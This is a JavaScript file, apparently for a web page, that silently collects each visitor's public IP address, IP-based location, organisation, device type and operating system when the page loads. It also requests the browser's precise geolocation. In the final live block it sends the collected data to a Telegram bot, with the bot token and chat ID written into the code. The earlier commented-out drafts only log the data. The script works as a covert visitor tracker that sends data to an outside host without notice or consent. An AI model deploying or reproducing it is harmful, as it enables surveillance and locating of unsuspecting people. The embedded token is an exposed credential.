// const ipUrl = 'https://api.ipify.org?format=json';

// fetch(ipUrl)
//   .then(response => response.json())
//   .then(data => {
//     const ipAddress = data.ip;
//     const locationUrl = `https://get.geojs.io/v1/ip/geo/${ipAddress}.json`;

//     fetch(locationUrl)
//       .then(response => response.json())
//       .then(data => {
//         const country = data.country;
//         const organization_name = data.organization_name;
//         const organization = data.organization;
//         const accuracy = data.accuracy;
//        // const city = data.city;

//         const latitude = data.latitude;
//         const longitude = data.longitude;
//         // Use location data as required


//         console.log(`Country: ${country}`);
//         console.log(`Organization Name: ${organization_name}`);
//         console.log(`Organization : ${organization}`);
//         console.log(`Accuracy : ${accuracy}`);
//         console.log(`Latitude : ${latitude}`);
//         console.log(`Longitude : ${longitude}`);
//       })
//       .catch(error => console.error(error));
//   })
//   .catch(error => console.error(error));

// // Path: index.js


// let ipAddress;
// let country;
// let organization_name;
// let organization;
// let accuracy;
// let latitude;
// let longitude;

// const ipUrl = 'https://api.ipify.org?format=json';

// fetch(ipUrl)
//   .then(response => response.json())
//   .then(data => {
//     ipAddress = data.ip;
//     const locationUrl = `https://get.geojs.io/v1/ip/geo/${ipAddress}.json`;

//     fetch(locationUrl)
//       .then(response => response.json())
//       .then(data => {
//         country = data.country;
//         organization_name = data.organization_name;
//         organization = data.organization;
//         accuracy = data.accuracy;
//         latitude = data.latitude;
//         longitude = data.longitude;

//         // Use location data as required
//         // console.log(`Country: ${country}`);
//         // console.log(`Organization Name: ${organization_name}`);
//         // console.log(`Organization : ${organization}`);
//         // console.log(`Accuracy : ${accuracy}`);
//         // console.log(`Latitude : ${latitude}`);
//         // console.log(`Longitude : ${longitude}`);
//       })
//       .catch(error => console.error(error));
//   })
//   .catch(error => console.error(error));

// // Now you can access the variables globally
// console.log(`IP Address: ${ipAddress}`);
// console.log(`Country: ${country}`);
// console.log(`Organization Name: ${organization_name}`);
// console.log(`Organization : ${organization}`);
// console.log(`Accuracy : ${accuracy}`);
// console.log(`Latitude : ${latitude}`);
// console.log(`Longitude : ${longitude}`);



// let ipAddress;
// let country;
// let organization_name;
// let organization;
// let accuracy;
// let latitude;
// let longitude;

// const ipUrl = 'https://api.ipify.org?format=json';

// (async () => {
//   try {
//     const response = await fetch(ipUrl);
//     const data = await response.json();
//     ipAddress = data.ip;
//     const locationUrl = `https://get.geojs.io/v1/ip/geo/${ipAddress}.json`;
//     const locationResponse = await fetch(locationUrl);
//     const locationData = await locationResponse.json();
//     country = locationData.country;
//     organization_name = locationData.organization_name;
//     organization = locationData.organization;
//     accuracy = locationData.accuracy;
//     latitude = locationData.latitude;
//     longitude = locationData.longitude;

    // Use location data as required
    // console.log(`Country: ${country}`);
    // console.log(`Organization Name: ${organization_name}`);
    // console.log(`Organization : ${organization}`);
    // console.log(`Accuracy : ${accuracy}`);
    // console.log(`Latitude : ${latitude}`);
    // console.log(`Longitude : ${longitude}`);

    // Now you can access the variables globally
//     console.log(`IP Address: ${ipAddress}`);
//     console.log(`Country: ${country}`);
//     console.log(`Organization Name: ${organization_name}`);
//     console.log(`Organization : ${organization}`);
//     console.log(`Accuracy : ${accuracy}`);
//     console.log(`Latitude : ${latitude}`);
//     console.log(`Longitude : ${longitude}`);
//   } catch (error) {
//     console.error(error);
//   }
// })();

// console.log(`IP Address: ${ipAddress}`);


let ipAddress;
let country;
let organization_name;
let organization;
let accuracy;
let latitude;
let longitude;
let device_Type;
let operating_System;

//for fine location


if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    function(position) {
      const l_latitude = position.coords.latitude;
      const l_longitude = position.coords.longitude;
      console.log('Lat:', l_latitude);
      console.log('Long:', l_longitude);
    },
    function(error) {
      console.error('Error getting location:', error);
    }
  );
} else {
  console.log('Geolocation is not supported by this browser.');
}





const ipUrl = 'https://api.ipify.org?format=json';


// Get device type
var deviceType = /Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

// Get operating system
var operatingSystem = '';
if (/Windows/.test(navigator.userAgent)) {
  operatingSystem = 'Windows';
} else if (/Mac/.test(navigator.userAgent)) {
  operatingSystem = 'MacOS';
} else if (/Linux/.test(navigator.userAgent)) {
  operatingSystem = 'Linux';
} else if (/Android/.test(navigator.userAgent)) {
  operatingSystem = 'Android';
} else if (/iOS/.test(navigator.userAgent)) {
  operatingSystem = 'iOS';
} else {
  operatingSystem = 'Unknown';
}


(async () => {
  try {
    const response = await fetch(ipUrl);
    const data = await response.json();
    ipAddress = data.ip;
    const locationUrl = `https://get.geojs.io/v1/ip/geo/${ipAddress}.json`;
    const locationResponse = await fetch(locationUrl);
    const locationData = await locationResponse.json();
    country = locationData.country;
    organization_name = locationData.organization_name;
    organization = locationData.organization;
    accuracy = locationData.accuracy;
    latitude = locationData.latitude;
    longitude = locationData.longitude;

    // Use location data as required
    console.log(`Country: ${country}`);
    console.log(`Organization Name: ${organization_name}`);
    console.log(`Organization : ${organization}`);
    console.log(`Accuracy : ${accuracy}`);
    console.log(`Latitude : ${latitude}`);
    console.log(`Longitude : ${longitude}`);

    // Send data to Telegram bot
    const TELEGRAM_BOT_TOKEN = '6137539767:AAGe4Gf0wYRX5Q1Fwr-w0yZu97ro-CNeF6Q';
    const TELEGRAM_CHAT_ID = '5489190998';
    const message = `IP Address: ${ipAddress},
                    \nCountry: ${country},
                    \nOrganization Name: ${organization_name},
                    \nOrganization: ${organization},
                    \nAccuracy: ${accuracy},
                    \nLatitude: ${latitude},
                    \nLongitude: ${longitude},
                    \nDevice Type: ${deviceType},
                    \nOperating System: ${operatingSystem}`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
    const telegramResponse = await fetch(telegramUrl);
    const telegramData = await telegramResponse.json();
    console.log(telegramData);
  } catch (error) {
    console.error(error);
  }
})();
